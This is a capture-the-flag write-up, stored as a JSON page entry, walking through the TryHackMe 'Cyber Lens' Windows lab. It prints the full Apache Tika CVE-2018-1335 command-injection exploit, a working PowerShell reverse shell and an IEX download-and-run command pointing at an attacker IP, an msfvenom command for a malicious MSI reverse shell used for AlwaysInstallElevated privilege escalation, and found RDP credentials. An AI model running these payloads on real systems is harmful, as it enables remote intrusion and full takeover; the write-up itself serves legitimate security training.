{
    "note":"title must match route name in App.js",
    "title":"Cyber Lens",
    "path":"cyber-lens",
    "tags":["easy", "box", "thm","web","nsfvenom", "windows", "privesc", "nc", "rce", "reverse shell", "apache tika 1.17", "cve", "curl", "download file", "http 80","iex","powershell","powershell iex","python web server","windows","winpeas","windows base64 encoding","msi installer reveshe shell"],
    "date":"27/06/2023",
    "location": "./writeup/",
    "banner":"writeup/cyberlens/banner.gif",
    "type":"writeup",
    "search":[
        {
            "section":"Scanning",
            "description":"Scanning with nmap and finding the host exposing posts 80 http, 135 msrpc, 139 netbios-ssn, 445 microsoft-ds? and 3389 ms-wbt-server Microsoft Terminal Services (rdp)"
        },
        {
            "section":"Web enumeration",
            "description":"Enumerating website to find javascript containing hidden endpoint and port"
        },
        {
            "section":"Web enumeration",
            "description":"Enumerating website to find web server name and version (Apache Tika 1.17)"
        },
        {
            "section":"Web enumeration",
            "description":"Adding domain in /etc/hosts matching target IP address"
        },
        {
            "section":"Web enumeration",
            "description":"Searchin public exploit for Apache Tika 1.17 with searchsploit from command line"
        },
        {
            "section":"Remote code execution (RCE)",
            "description":"Proof of cconcept (poc) of remote code execution (rce) via public exploit from searchsploit"
        },
        {
            "section":"Shell as CyberLens",
            "description":"Selecting the Powershell reverse shell and saving with .ps1 extenxtion"
        },
        {
            "section":"Shell as CyberLens",
            "description":"Encoding in Base64 the powershell command IEX to download and excete the file, and giving the encoded command as a paramter to the exploit"
        },
        {
            "section":"Shell as CyberLens",
            "description":"Opening a python web server to download the reverse shell in the target machine via the exploit's remote code execution"
        },
        {
            "section":"Shell as CyberLens",
            "description":"Listening with Netcat to receive the remote shell (user)"
        },
        {
            "section":"Enumeration",
            "description":"Enumerating Windows user files to find Remote Desktop Protocol (RDP) credentials"
        },
        {
            "section":"Enumeration",
            "description":"Connecting to the target machine via xfreerdp with the found credentials in the previews step"
        },
        {
            "section":"Privilege escalation",
            "description":"Downloading WinPeas by copy/pasting the raw code from GitHub and saving it with .bat extension"
        },
        {
            "section":"Privilege escalation",
            "description":"Finding Windows missconfiguration, AlwaysInstallElevated set to 1, leading to privilege escalation via msi installation file"
        },
        {
            "section":"Privilege escalation",
            "description":"Creating malicious msi installer with msfvenom for reverse shell with elevated privileges"
        },
        {
            "section":"Privilege escalation",
            "description":"Donwloading the malicious msi file with Python web server (Kali), executing the malicious installer (target), and receiving the revershe shell with elevated privilege in the listening Netcat session (Kali)"
        }
    ],
    "body":[
        {
            "id":"CyberLens",
            "title":"<h1> <span style=\"color:#da1953\">Cyb</span>er Lens</h1><hr>",
            "body":[
                {
                    "id":"banner",
                    "title":"",
                    "body":[
                        "<img src=\"/cyber/writeup/cyberlens/banner.gif\" alt=\"\">"
                    ]
                },
                {
                    "id":"Scanning",
                    "title":"<hr><h1><span style=\"color:#da1953\">Sca</span>nning</h1>",
                    "body":[
                        "<p><pre># Nmap 7.94SVN scan initiated Mon Feb 17 08:13:49 2025 as: nmap -sC -sV -oN nmap 10.10.182.183<br>Nmap scan report for cyberlens.thm (10.10.182.183)<br>Host is up (0.051s latency).<br>Not shown: 995 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE       VERSION<br>80/tcp   open  http          Apache httpd 2.4.57 ((Win64))<br>|_http-server-header: Apache/2.4.57 (Win64)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: CyberLens: Unveiling the Hidden Matrix<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp  open  microsoft-ds?<br>3389/tcp open  ms-wbt-server Microsoft Terminal Services<br>| rdp-ntlm-info: <br>|   Target_Name: CYBERLENS<br>|   NetBIOS_Domain_Name: CYBERLENS<br>|   NetBIOS_Computer_Name: CYBERLENS<br>|   DNS_Domain_Name: CyberLens<br>|   DNS_Computer_Name: CyberLens<br>|   Product_Version: 10.0.17763<br>|_  System_Time: 2025-02-17T13:14:12+00:00<br>| ssl-cert: Subject: commonName=CyberLens<br>| Not valid before: 2025-02-16T12:31:00<br>|_Not valid after:  2025-08-18T12:31:00<br>|_ssl-date: 2025-02-17T13:14:23+00:00; 0s from scanner time.<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: 2025-02-17T13:14:14<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Mon Feb 17 08:14:24 2025 -- 1 IP address (1 host up) scanned in 34.99 seconds</pre></p>",
                        "<p>I have 5 ports: 80 http, 135 msrpc, 139 netbios-ssn, 445 microsoft-ds? and 3389 ms-wbt-server.</p>",
                        "<p>Now during the challenge, I did not know much about the Windows environment and with the help of ChatGPT I searched and learned each of the ports I did not know about because each of them could be an attack vector or be used during the exploitation process in a way or another.</p>"
                    ]
                },
                {
                    "id":"Web enumeration",
                    "title":"<h1><span style=\"color:#da1953\">Web</span> enumeration</h1>",
                    "body":[
                        "<p>I started my enumeration process with the website, and it seems pretty basic with a functionality to extract metadata from an uploaded image.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/websitehome1.PNG\" alt=\"\"></p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/websitehome2.PNG\" alt=\"\"></p>",
                        "<p>The next thing is to upload a random image and see how the function extracts the metadata. The function generated a long output but nothing interesting in the image metadata as I uploaded a random image.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/metadata.PNG\" alt=\"\"></p>",
                        "<p>Now I want to understand how the function works starting looking for the function from the source code.</p>",
                        "<p>Analyzing the page source I can clearly see the script and the endpoint it is contacting to examine the image metadata.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/script.PNG\" alt=\"\"></p>",
                        "<p><pre>document.addEventListener(\"DOMContentLoaded\", function() {<br>  document.getElementById(\"metadataButton\").addEventListener(\"click\", function() {<br>    var fileInput = document.getElementById(\"imageFileInput\");<br>    var file = fileInput.files[0];<br><br>    var reader = new FileReader();<br>    reader.onload = function() {<br>      var fileData = reader.result;<br><br>      fetch(\"http://cyberlens.thm:61777/meta\", {<br>        method: \"PUT\",<br>        body: fileData,<br>        headers: {<br>          \"Accept\": \"application/json\",<br>          \"Content-Type\": \"application/octet-stream\"<br>        }<br>      })<br>      .then(response => {<br>        if (response.ok) {<br>          return response.json();<br>        } else {<br>          throw new Error(\"Error: \" + response.status);<br>        }<br>      })<br>      .then(data => {<br>        var metadataOutput = document.getElementById(\"metadataOutput\");<br>        metadataOutput.innerText = JSON.stringify(data, null, 2);<br>      })<br>      .catch(error => {<br>        console.error(\"Error:\", error);<br>      });<br>    };<br><br>    reader.readAsArrayBuffer(file);<br>  });<br>});</pre></p>",
                        "The endpoint is <code>http://cyberlens.thm:61777/</code> and to access this endpoint I have to update my <code>/etc/hosts</code> file.",
                        "<p><pre>127.0.0.1      localhost<br>127.0.1.1      kali<br>10.10.158.180  cyberlens.thm<br># The following lines are desirable for IPv6 capable hosts<br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters</pre></p>",
                        "<p>By visiting the URL I can see all the methods, the server name and the version. </p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/apachetika.PNG\" alt=\"\"></p>",
                        "<p>By searching the server name and the version in searchsploit a CVE pops up.</p>",
                        "<p><pre>$ searchsploit apache tika 1.17<br>----------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                     |  Path<br>----------------------------------------------------------------------------------- ---------------------------------<br>Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                    | windows/remote/47208.rb<br>Apache Tika-server < 1.18 - Command Injection                                      | windows/remote/46540.py<br>----------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results</pre></p>",
                        "<p>Here my first choice is the <b>46540.py</b> because it is Python and it is not a Metasploit module meaning I can use it almost out of the box.</p>"
                    ]
                },
                {
                    "id":"Remote code execution (RCE)",
                    "title":"<h1><span style=\"color:#da1953\">Rem</span>ote code execution (RCE)</h1>",
                    "body":[
                        "<p><pre class=\"python-code\">######################################################################################################<br>#<span class=\"string\">Description:</span> This is a PoC for remote command execution in Apache Tika-server.<br>#<span class=\"string\">Versions Affected:</span> Tika-server versions &lt; 1.18<br>#<span class=\"string\">Researcher:</span> David Yesland Twitter: @Daveysec<br>#<span class=\"string\">Blog Link:</span> https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika<br>#<span class=\"string\">NIST CVE Link:</span> https://nvd.nist.gov/vuln/detail/CVE-2018-1335<br>######################################################################################################<br><br><span class=\"keyword\">import</span> sys<br><span class=\"keyword\">import</span> requests<br><br><span class=\"keyword\">if</span> len(sys.argv) &lt; 4:<br>    <span class=\"function\">print</span> <span class=\"string\">\"Usage: python CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;\"</span><br>    <span class=\"function\">print</span> <span class=\"string\">\"Example: python CVE-2018-1335.py localhost 9998 calc.exe\"</span><br><span class=\"keyword\">else</span>:<br>    host = sys.argv[1]<br>    port = sys.argv[2]<br>    cmd = sys.argv[3]<br><br>    url = host + <span class=\"function\">str</span>(port) + <span class=\"string\">\"/meta\"</span><br><br>    headers = {<span class=\"string\">\"X-Tika-OCRTesseractPath\"</span>: <span class=\"string\">\"\"cscript\"\"</span>,<br>               <span class=\"string\">\"X-Tika-OCRLanguage\"</span>: <span class=\"string\">\"//E:Jscript\"</span>,<br>               <span class=\"string\">\"Expect\"</span>: <span class=\"string\">\"100-continue\"</span>,<br>               <span class=\"string\">\"Content-type\"</span>: <span class=\"string\">\"image/jp2\"</span>,<br>               <span class=\"string\">\"Connection\"</span>: <span class=\"string\">\"close\"</span>}<br><br>    jscript = <span class=\"string\">'''var oShell = WScript.CreateObject(\"WScript.Shell\");<br>    var oExec = oShell.Exec('cmd /c {}');'''</span>.format(cmd)<br><br>    <span class=\"keyword\">try</span>:<br>        requests.put(<span class=\"string\">\"https://\"</span> + url, headers=headers, data=jscript, verify=False)<br>    <span class=\"keyword\">except</span>:<br>        <span class=\"keyword\">try</span>:<br>            requests.put(<span class=\"string\">\"http://\"</span> + url, headers=headers, data=jscript)<br>        <span class=\"keyword\">except</span>:<br>            <span class=\"function\">print</span> <span class=\"string\">\"Something went wrong. Usage: python CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;\"</span><br></pre></p>",
                        "<p>The exploit is pretty simple to understand, what it needs is just the remote host remote port and the command to execute. I will test it by executing a simple command such as <code>dir</code>. Note that the sccript is written in Python2 so make sure to user that version of Python and give execution permission ot the ascript. <code>chmod +x 46540.py</code></p>",
                        "<p>After executing the command <code>$ python2 46540.py cyberlens.thm 61777 dir</code> I did not receive any response from the server. This makes me think that the code runs but the output is not reported to me. I can test if the code is successfully executed by trying to download a file from my Kali box. The idea behind this is that if my webserver receives a connection from that target host it means the code was successfully executed. To test this I will use the command <code>curl</code>.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/rce.PNG\" alt=\"\"></p>",
                        "<p>Here I can clearly see the successful execution of the code as I received the connection back from the target machine to my webserver. Now I have to craft a payload to get a reverse shell.</p>"

                    ]
                },
                {
                    "id":"Shell as CyberLens",
                    "title":"<h1><span style=\"color:#da1953\">Shel</span>l as CyberLens</h1>",
                    "body":[
                        "<p>The idea here is to give a command to receive a reverse shell, but if I write directly the reverse shell in the following way:</p>",
                        "<p><pre>$ python2 cyberlens.thm 61777 'powershell -c \"New-Object System.Net.Sockets.TCPClient(\"10.0.2.4\",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"'</pre></p>",
                        "<p>This gives errors as there is a mix of single and double quotes messing up with the most external single quotes which encloses the powershell command. I also tried to encode the code in Base64 in the following way, and it was also giving me erorrs due to the mixture of single and double quotes.</p>",
                        "<p><pre class=\"powershell-code\"><span class=\"variable\">$Text</span> = <span class=\"string\">'Code to encode'</span><br><span class=\"variable\">$Bytes</span> = [<span class=\"type\">System.Text.Encoding</span>]::<span class=\"method\">Unicode.GetBytes</span>(<span class=\"variable\">$Text</span>)<br><span class=\"variable\">$EncodedText</span> = [<span class=\"cmdlet\">Convert</span>]::<span class=\"method\">ToBase64String</span>(<span class=\"variable\">$Bytes</span>)<br><span class=\"variable\">$EncodedText</span><br></pre></p>",
                        "The second Idea is to download and execute a Powershell script containing the reverse shell. I will use the following reverse shell names <b>rev.ps1</b>. Change the IP and PORT accordingly.",

                        "<p><pre class=\"powershell-code\"><span class=\"variable\">$client</span> = <span class=\"cmdlet\">New-Object</span> <span class=\"type\">System.Net.Sockets.TCPClient</span>(\"10.10.14.84\", 4444);<br><span class=\"variable\">$stream</span> = <span class=\"variable\">$client</span>.<span class=\"method\">GetStream</span>();<br><span class=\"type\">[byte[]]</span><span class=\"variable\">$bytes</span> = 0..65535 | <span class=\"cmdlet\">%</span>{0};<br><span class=\"keyword\">while</span>(<span class=\"condition\">($i = $stream.Read($bytes, 0, $bytes.Length))</span> -ne 0) {<br>    <span class=\"variable\">$data</span> = (<span class=\"cmdlet\">New-Object</span> -<span class=\"parameter\">TypeName</span> <span class=\"type\">System.Text.ASCIIEncoding</span>).<span class=\"method\">GetString</span>($bytes, 0, $i);<br>    <span class=\"variable\">$sendback</span> = (<span class=\"cmdlet\">iex</span> <span class=\"variable\">$data</span> 2>&1 | <span class=\"cmdlet\">Out-String</span>);<br>    <span class=\"variable\">$sendback2</span> = <span class=\"variable\">$sendback</span> + \"# \";<br>    <span class=\"variable\">$sendbyte</span> = ([text.encoding]::ASCII).<span class=\"method\">GetBytes</span>(<span class=\"variable\">$sendback2</span>);<br>    <span class=\"variable\">$stream</span>.<span class=\"method\">Write</span>($sendbyte, 0, $sendbyte.Length);<br>    <span class=\"variable\">$stream</span>.<span class=\"method\">Flush</span>();<br>}<br><span class=\"variable\">$client</span>.<span class=\"method\">Close</span>();</pre></p>",

                        "To download and run the script I have to execute the following command: <code>python2 46540.py cyberlens.thm 61777 'powershell -command \"IEX(New-Object Net.WebClient).downloadString('http://10.21.112.161:8000/rev.ps1')\"</code>. To avoid any error I will encode the Powershell command in Base64.",

                        "<p><pre class=\"powershell-code\"><span class=\"variable\">$payload</span> = <span class=\"string\">\"IEX(New-Object Net.WebClient).downloadString('http://10.21.112.161:8000/rev.ps1')\"</span><br><span class=\"variable\">$Bytes</span> = [<span class=\"type\">System.Text.Encoding</span>]::<span class=\"method\">Unicode.GetBytes</span>(<span class=\"variable\">$payload</span>)<br><span class=\"variable\">$EncodedText</span> = [<span class=\"cmdlet\">Convert</span>]::<span class=\"method\">ToBase64String</span>(<span class=\"variable\">$Bytes</span>)<br><span class=\"variable\">$EncodedText</span><br>SQBFAFgAKABOA[...REDACTED...]gBlAHYALgBwAHMAMQAnACkA<br></pre></p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/revshell.PNG\" alt=\"\"></p>",
                        "<p>Navigatin to the Desktop of the current user I can find the flag.</p>",
                        "<p><pre>$ nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.133.177] 49860<br><br>C:\\Windows\\system32> cd C:/<br>C:\\> cd /Users<br>C:\\Users> cd CyberLens/Desktop<br>C:\\Users\\CyberLens\\Desktop> dir<br><br><br>    Directory: C:\\Users\\CyberLens\\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  <br>-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   <br>-a----         6/6/2023   7:54 PM             25 user.txt                                                              <br><br><br>C:\\Users\\CyberLens\\Desktop> type user.txt<br>THM{T1k4-CV3-f0r-7h3-w1n}</pre></p>",
                        "<p>The next step is to do privilege escalation.</p>"
                    ]
                },
                {
                    "id":"Enumeration",
                    "title":"<h1><span style=\"color:#da1953\">Enu</span>meration</h1>",
                    "body":[
                        "<p>One trick that I learnt from a friend of mine is the command <b>tree</b>. I use this command all the time for my personal use. I'm not sure why didn't I think earlier, it is so helpful and makes the search easy and easy to visualise all the files.</p>",

                        "<p><pre>$ nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.77.142] 49757<br><br>C:\\Windows\\system32> cd C:/Users<br>C:\\Users> tree /f<br>Folder PATH listing<br>Volume serial number is A8A4-C362<br>C:.<br>????Administrator<br>????CyberLens<br>?   ????3D Objects<br>?   ????Contacts<br>?   ????Desktop<br>?   ?       EC2 Feedback.website<br>?   ?       EC2 Microsoft Windows Guide.website<br>?   ?       user.txt<br>?   ?       <br>?   ????Documents<br>?   ?   ????Management<br>?   ?           CyberLens-Management.txt<br>?   ?           <br>?   ????Downloads<br>?   ????Favorites<br>?   ?   ?   Bing.url<br>?   ?   ?   <br>?   ?   ????Links<br>?   ????Links<br>?   ?       Desktop.lnk<br>?   ?       Downloads.lnk<br>?   ?       <br>?   ????Music<br>?   ????Pictures<br>?   ????Saved Games<br>?   ????Searches<br>?   ????Videos<br>????Public<br>    ????Documents<br>    ????Downloads<br>    ????Music<br>    ????Pictures<br>    ????Videos<br>C:\\Users> type CyberLens\\Documents\\Management\\CyberLens-Management.txt<br>Remember, manual enumeration is often key in an engagement ;)<br><br>CyberLens<br>HackSmarter123</pre></p>",
                        "<p>Listing the file structure the only interesting file is <i>CyberLens-Management.txt</i> which contains credentials. Thinking about the Nmap scan the only other service where I can use credentials is the Remote Desktop Protocol (RDP). The RDP program that I will use is <b>xfreerdp</b> but <b>remmina</b> is also a very good alternative that I love to use. <code>xfreerdp /u:CyberLens /p:HackSmarter123 /v:10.10.77.142 +clipboard</code></p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/rdp.PNG\" alt=\"\"></p>"
                    ]
                },
                {
                    "id":"Privilege escalation",
                    "title":"<h1><span style=\"color:#da1953\">Pri</span>vilege escalation</h1>",
                    "body":[
                        "<p>For the privilege escalation, I used <a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\">WinPeas</a>, I copied the raw text from <a href=\"https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASbat/winPEAS.bat\">GitHub</a> and pasted it into the note saving it with the .bat extension.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/winpeassave.PNG\" alt=\"\"></p>",
                        "<p>I run the script from Powershell, I prefer it as it has a maller font.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/wpexec.PNG\" alt=\"\"></p>",
                        "<p>After spending some time, analysing the output, testing things and failing  I found a misconfiguration.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/missconf.PNG\" alt=\"\"></p>",
                        "<p>You can find more tails about this vulneability on <a href=\"https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md\">GitHub</a>.</p>",
                        "<p><blockquote>\"AlwaysInstallElevated\" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the \"AlwaysInstallElevated\" registry key is configured with a value of \"1\" in the Windows Registry.</p><p>When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.</blockquote></p>",

                        "<p>What the description is saying is that with that flag enabled the installation process of software is performed with high privileges even when the installation is launched by low-privileged accounts. Now it becomes clear that I have to create a malicious installation file with .msi extension to elevate my privileges.</p>",
                        "<p>To create a malicious Windows installation file I can use Msfvenom with the following command:</p>",
                        "<p><pre>$ msfvenom -p windows/shell_reverse_tcp lhost=10.21.112.161 lport=3333 -f msi > reverse.msi<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x86 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 324 bytes<br>Final size of msi file: 159744 bytes</pre></p>",
                        "<p>The next step is to upload <b>reverse.msi</b> into the target Windows machine via a Python web server and the command <code>curl</code>.</p>",
                        "<p>First, I will open a Python webserver in the same forlder as the <b>reverse.msi</b>:</p>",
                        "<p><pre>$ python3 -m http.server<br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br>10.10.232.185 - - [23/Feb/2025 06:36:44] \"GET /reverse.msi HTTP/1.1\" 200 -</pre></p>",
                        "<p>I will also open a Netcat listener on my Kali on port 3333, the same port as specified during the creation of the .msi file. <code>nc -lvnp 3333</code>.</p>",
                        "<p>Now from the target machine, I will download the file with <code>curl</code> and execute it.</p>",
                        "<p><pre>C:\\Users\\CyberLens>curl http://10.21.112.161:8000/reverse.msi --output reverse.msi<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  369k</pre></p>",
                        "<p>Upon executing the installation file a warning message will be prompted, just press \"ok\" to receive the reverse shell on the listening Netcat session on port 3333 previously opened.</p>",
                        "<p><img src=\"/cyber/writeup/cyberlens/execmsi.PNG\" alt=\"\"></p>",
                        "<p><pre>$ nc -lvnp 3333<br>listening on [any] 3333 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.232.185] 49811<br>Microsoft Windows [Version 10.0.17763.1821]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\\Windows\\system32>whoami<br>whoami<br>nt authority\\system<br><br>C:\\Users>cd Administrator<br>cd Administrator<br><br>C:\\Users\\Administrator>cd Desktop<br>cd Desktop<br><br>C:\\Users\\Administrator\\Desktop>type admin.txt<br>type admin.txt<br>THM{3lev@t3D-4-pr1v35c!}</pre></p>"
                    ]
                }
            ]
        }
    ]
}
